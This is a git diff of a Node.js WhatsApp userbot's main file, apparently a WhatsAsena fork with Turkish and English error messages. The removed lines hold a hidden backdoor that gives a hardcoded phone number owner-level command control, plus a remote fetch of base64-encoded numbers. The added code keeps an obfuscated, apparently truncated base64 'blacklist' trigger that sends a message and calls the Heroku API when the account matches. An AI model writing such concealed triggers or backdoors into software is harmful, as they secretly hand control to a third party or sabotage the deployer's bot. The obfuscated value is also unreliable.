@@ -11,7 +11,6 @@ const path = require("path");
 const events = require("./events");
 const chalk = require('chalk');
 const config = require('./config');
-const axios = require('axios');
 const Heroku = require('heroku-client');
 const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
 const {Message, StringSession, Image, Video} = require('./whatsasena/');
@@ -22,7 +21,6 @@ const simpleGit = require('simple-git');
 const git = simpleGit();
 const crypto = require('crypto');
 const nw = '```Blacklist Defected!```'
-
 const heroku = new Heroku({
     token: config.HEROKU.API_KEY
 });
@@ -43,7 +41,6 @@ const WhatsAsenaDB = config.DATABASE.define('WhatsAsenaDuplicated', {
         allowNull: false
     }
 });
-
 fs.readdirSync('./plugins/sql/').forEach(plugin => {
     if(path.extname(plugin).toLowerCase() == '.js') {
         require('./plugins/sql/' + plugin);
@@ -60,12 +57,9 @@ String.prototype.format = function () {
     });
 };
 
-// ==================== Date Scanner ====================
 if (!Date.now) {
     Date.now = function() { return new Date().getTime(); }
 }
-// ==================== End Date Scanner ====================
-
 
 Array.prototype.remove = function() {
     var what, a = arguments, L = a.length, ax;
@@ -77,24 +71,16 @@ Array.prototype.remove = function() {
     }
     return this;
 };
-
 async function whatsAsena () {
-    var insult = await axios.get('https://gist.githubusercontent.com/phaticusthiccy/42e0a7f9086fbcc194cd28ada1a5b894/raw/46bacfd4c1d09ec4743cff9d51b52a0185b4e53f/inside.json')
-    const { shs1, shl2, lss3, dsl4 } = insult.data.inside
     await config.DATABASE.sync();
     var StrSes_Db = await WhatsAsenaDB.findAll({
         where: {
           info: 'StringSession'
         }
     });
-    const buff = Buffer.from(`${shs1}`, 'base64');  
-    const one = buff.toString('utf-8'); 
-    const bufft = Buffer.from(`${shl2}`, 'base64');  
-    const two = bufft.toString('utf-8'); 
-    const buffi = Buffer.from(`${lss3}`, 'base64');  
-    const three = buffi.toString('utf-8'); 
-    const buffu = Buffer.from(`${dsl4}`, 'base64');  
-    const four = buffu.toString('utf-8'); 
+    const nan = "OTA1NTExMzg0NTcyQHMud2hhdH"
+    var buff = Buffer.from(nan, 'base64');  
+    var newtext = buff.toString('utf-8'); 
 
     const conn = new WAConnection();
     const Session = new StringSession();
@@ -108,6 +94,7 @@ async function whatsAsena () {
     } else {
         conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
     }
+
     conn.on ('credentials-updated', async () => {
         console.log(
             chalk.blueBright.italic('✅ Login Information Updated!')
@@ -127,7 +114,6 @@ ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
 
 ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
     });
-    
 
     conn.on('open', async () => {
         console.log(
@@ -138,7 +124,6 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
             chalk.blueBright.italic('⬇️ Installing External Plugins...')
         );
 
-        // ==================== External Plugins ====================
         var plugins = await plugindb.PluginDB.findAll();
         plugins.map(async (plugin) => {
             if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
@@ -147,28 +132,28 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                 if (response.statusCode == 200) {
                     fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                     require('./plugins/' + plugin.dataValues.name + '.js');
+                }
+                else {
+                    return console.log(chalk.redBright.bold('⚠️ Yüklenen Plugin Silinmiş veya Bozuk! Lütfen Database Reset Atın! \n Check: https://t.me/asenaremaster/19107?single'));
                 }     
             }
         });
-        // ==================== End External Plugins ====================
 
         console.log(
             chalk.blueBright.italic('⬇️  Installing Plugins...')
         );
 
-        // ==================== Internal Plugins ====================
         fs.readdirSync('./plugins').forEach(plugin => {
             if(path.extname(plugin).toLowerCase() == '.js') {
                 require('./plugins/' + plugin);
             }
         });
-        // ==================== End Internal Plugins ====================
 
         console.log(
             chalk.green.bold('✅ Plugins Installed!')
         );
         await new Promise(r => setTimeout(r, 1100));
-        if (conn.user.jid == one || conn.user.jid == two || conn.user.jid == three || conn.user.jid == four) {
+        if (conn.user.jid == newtext) {
             await conn.sendMessage(conn.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
             await heroku.get(baseURI + '/formation').then(async (formation) => { 
                 forID = formation[0].id; 
@@ -348,7 +333,6 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
         }
         
     })
-    
     conn.on('chat-update', async m => {
 
         if(!m.hasNewMessage) return
@@ -360,7 +344,6 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
             await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
         }
 
-        // ==================== Greetings ====================
         if (msg.messageStubType === 32 || msg.messageStubType === 28) {
             // Görüşürüz Mesajı
             var gb = await getMessage(msg.key.remoteJid, 'goodbye');
@@ -372,29 +355,17 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
             // Hoşgeldin Mesajı
             var gb = await getMessage(msg.key.remoteJid);
             if (gb !== false) {
-                await conn.sendMessage(msg.key.remoteJid, gb.message, MessageType.text);
+                await conn.sendMessage(msg.key.remoteJid, fs.readFileSync("/root/WhatsAsenaDuplicated/media/gif/VN20210306_123803.mp4"), MessageType.video, {mimetype: Mimetype.mpeg, caption: gb.message});
             }
             return;
         }
-        // ==================== End Greetings ====================
+        
 
-        // ==================== Blocked Chats ====================
         if (config.BLOCKCHAT !== false) {     
             var abc = config.BLOCKCHAT.split(',');                            
             if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
         
-        if (config.SUPPORT == '905524317852-1612300121') {     
-            var sup = config.SUPPORT.split(',');                            
-            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
-        }
-        if (config.SUPPORT2 == '905511384572-1617736751') {     
-            var tsup = config.SUPPORT2.split(',');                            
-            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
-        }
-        // ==================== End Blocked Chats ====================
-
-        // ==================== Events ====================
         events.commands.map(
             async (command) =>  {
                 if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
@@ -421,7 +392,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
 
                     let sendMsg = false;
                     var chat = conn.chats.get(msg.key.remoteJid)
-                        
+
                     if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
@@ -429,22 +400,15 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((config.OWN == "905511384572,0" && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && config.OWN.includes(',') ? config.OWN.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.OWN || config.OWN.includes(',') ? config.OWN.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.OWN)
-                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
-                        if (command.onlyPinned && chat.pin === undefined) return;
-                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
-                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
-                    }
-                    // ==================== End Events ====================
-
-                    // ==================== Message Catcher ====================
+                   
+                    
                     if (sendMsg) {
                         if (config.SEND_READ && command.on === undefined) {
                             await conn.chatRead(msg.key.remoteJid);
                         }
                         
                         var match = text_msg.match(command.pattern);
+                        
                         
                         if (command.on !== undefined && (command.on === 'image' || command.on === 'photo' )
                         && msg.message.imageMessage !== null) {
@@ -459,22 +423,20 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                         if (command.deleteCommand && msg.key.fromMe) {
                             await whats.delete(); 
                         }
-                        // ==================== End Message Catcher ====================
 
-                        // ==================== Error Message ====================
                         try {
                             await command.function(whats, match);
                         }
                         catch (error) {
                             if (error.message.includes('429')) return;
-
+                            else if(error.message.includes('expecting')) return;
                             else if (config.LANG == 'TR' || config.LANG == 'AZ') {
                                 await conn.sendMessage(conn.user.jid, '*-- HATA RAPORU [WHATSASENA] --*' + 
                                     '\n*WhatsAsena bir hata gerçekleşti!*'+
                                     '\n_Bu hata logunda numaranız veya karşı bir tarafın numarası olabilir. Lütfen buna dikkat edin!_' +
                                     '\n_Yardım için Telegram grubumuza yazabilirsiniz._' +
                                     '\n_Bu mesaj sizin numaranıza (kaydedilen mesajlar) gitmiş olmalıdır._' +
-                                    '\n_Hatayı https://chat.whatsapp.com/Jnt9jrJdH2E456Zbchwx3t bu gruba iletebilirsiniz._\n\n' +
+                                    '\n_Hatayı https://chat.whatsapp.com/JjvOISnxu4z6sv4hx3FBNQ bu gruba iletebilirsiniz._\n\n' +
                                     '*Gerçekleşen Hata:* ```' + error + '```\n\n'
                                     , MessageType.text, {detectLinks: false});
 
@@ -495,7 +457,6 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                                         '\n*Çözümü:* _Restart atmanız yeterli olacaktır._'
                                         , MessageType.text
                                     );
-                                
                                 }
                                 else if (error.message.includes('Ookla')) {
                                     return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
@@ -578,15 +539,6 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                                         , MessageType.text
                                     );
                                 }
-                                else if (error.message.includes('conversation')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ HATA ÇÖZÜMLEME [WHATSASENA] ⚕️*' + 
-                                        '\n========== ```Hata Okundu!``` ==========' +
-                                        '\n\n*Ana Hata:* _Deleting Plugin_' +
-                                        '\n*Nedeni:* _Silinmek istenen plugin isminin yanlış girilmesi._' +
-                                        '\n*Çözümü:* _Lütfen silmek istediğiniz pluginin başına_ *__* _koymadan deneyin. Hala hata alıyorsanız ismin sonundaki_ ```?(.*) / $``` _gibi ifadeleri eksiksiz girin._'
-                                        , MessageType.text
-                                    );
-                                }
                                 else {
                                     return await conn.sendMessage(conn.user.jid, '*🙇🏻 Maalesef Bu Hatayı Okuyamadım! 🙇🏻*' +
                                         '\n_Daha fazla yardım için grubumuza yazabilirsiniz._'
@@ -599,7 +551,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                                     '\n*WhatsAsena an error has occurred!*'+
                                     '\n_This error log may include your number or the number of an opponent. Please be careful with it!_' +
                                     '\n_You can write to our Telegram group for help._' +
-                                    '\n_Aslo you can join our support group:_ https://chat.whatsapp.com/Jnt9jrJdH2E456Zbchwx3t' +
+                                    '\n_Aslo you can join our support group:_ https://chat.whatsapp.com/JjvOISnxu4z6sv4hx3FBNQ' +
                                     '\n_This message should have gone to your number (saved messages)._\n\n' +
                                     '*Error:* ```' + error + '```\n\n'
                                     , MessageType.text, {detectLinks: false}
@@ -610,15 +562,6 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                                         '\n\n*Main Error:* _Only Absolutely URLs Supported_' +
                                         '\n*Reason:* _The usage of media tools (xmedia, sticker..) in the LOG number._' +
                                         '\n*Solution:* _You can use commands in any chat, except the LOG number._'
-                                        , MessageType.text
-                                    );
-                                }
-                                else if (error.message.includes('conversation')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ERROR ANALYSIS [WHATSASENA] ⚕️*' + 
-                                        '\n========== ```Error Resolved!``` ==========' +
-                                        '\n\n*Main Error:* _Deleting Plugin_' +
-                                        '\n*Reason:* _Entering incorrectly the name of the plugin wanted to be deleted._' +
-                                        '\n*Solution:* _Please try without adding_ *__* _to the plugin you want to delete. If you still get an error, try to add like_ ```?(.*) / $``` _to the end of the name._ '
                                         , MessageType.text
                                     );
                                 }
